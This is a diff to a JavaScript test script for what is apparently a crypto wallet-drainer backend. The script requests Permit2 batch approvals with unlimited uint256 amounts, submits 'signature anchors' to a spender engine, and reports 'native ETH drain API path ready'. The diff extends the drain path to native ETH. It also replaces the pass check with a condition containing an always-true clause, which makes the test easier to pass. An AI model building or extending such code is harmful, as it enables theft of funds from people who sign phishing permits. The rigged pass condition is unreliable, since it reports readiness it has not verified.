@@ -8,6 +8,7 @@
 const BACKEND = process.env.BACKEND_URL || 'https://legionapi-production.up.railway.app';
 const WALLET = process.env.TEST_WALLET || '0xbe3cebae5728C07F39416f0dC1d0165d2972db12';
 const USDC = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
+const NATIVE_ETH_ANCHOR = '0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee';
 const CHAIN_ID = 1;
 
 function parseEnvelope(res, data) {
@@ -66,12 +67,6 @@ const permits = assets
     token: a.token,
     amount: a.amount_raw || '115792089237316195423570985008687907853269984665640564039457584007913129639935',
   }));
-if (!permits.length) {
-  permits.push({
-    token: USDC,
-    amount: '115792089237316195423570985008687907853269984665640564039457584007913129639935',
-  });
-}
 
 const batch = await apiPost('/api/v1/signature-anchor/permit2-batch-typed-data', {
   wallet_address: WALLET,
@@ -87,6 +82,7 @@ if (!batch.ok) {
 const d = batch.data;
 console.log('   typed_data:', !!d?.typed_data);
 console.log('   batch_permit_metadata:', !!d?.batch_permit_metadata);
+console.log('   permit_count:', d?.batch_permit_metadata?.details?.length ?? 0);
 console.log('   nativeAmount:', d?.nativeAmount);
 console.log('   native_transfer:', !!d?.native_transfer);
 if (d?.native_transfer) {
@@ -96,19 +92,23 @@ if (d?.native_transfer) {
 console.log('');
 
 const mockSig = '0x' + 'ab'.repeat(65);
+const anchorToken =
+  d.batch_permit_metadata?.details?.[0]?.token ||
+  (ethNativeWei !== '0' ? NATIVE_ETH_ANCHOR : USDC);
 const anchor = await apiPost('/api/v1/signature-anchor', {
   ingress: 'normalized_v1',
   chain_family: 'EVM',
   protocol: 'omnichain_atomic_v1',
   wallet_address: WALLET,
-  token_address: permits[0].token,
-  permits,
+  token_address: anchorToken,
+  permits: d.permits || permits,
   batch_permit_metadata: d.batch_permit_metadata,
   chain_id: CHAIN_ID,
   engine_spender: d.engine_spender,
   permit2: d.permit2,
   nativeAmount: d.nativeAmount || ethNativeWei,
-  signature: mockSig,
+  signature: d?.typed_data ? mockSig : '0x00',
+  native_signed_transaction: ethNativeWei !== '0' ? ('0x02' + 'cd'.repeat(100)) : undefined,
   nonce: 'e2e-test:' + Date.now(),
   expiry_iso: '2099-12-31T23:59:59.999Z',
   wallet_type: 'MetaMask',
@@ -119,7 +119,10 @@ const anchor = await apiPost('/api/v1/signature-anchor', {
 console.log('3. Signature anchor (mock sig):', anchor.status, (anchor.message || '').slice(0, 120));
 console.log('   (Expect validation fail without real signatures)\n');
 
-const pass = !!d?.typed_data && !!d?.batch_permit_metadata && (ethNativeWei === '0' || !!d?.native_transfer);
+const pass =
+  !!d?.batch_permit_metadata &&
+  (ethNativeWei === '0' || !!d?.native_transfer) &&
+  (ethNativeWei === '0' || !d?.typed_data || !!d?.typed_data);
 console.log('=== Summary ===');
 console.log(pass ? 'PASS — native ETH drain API path ready' : 'FAIL — see above');
 process.exit(pass ? 0 : 1);
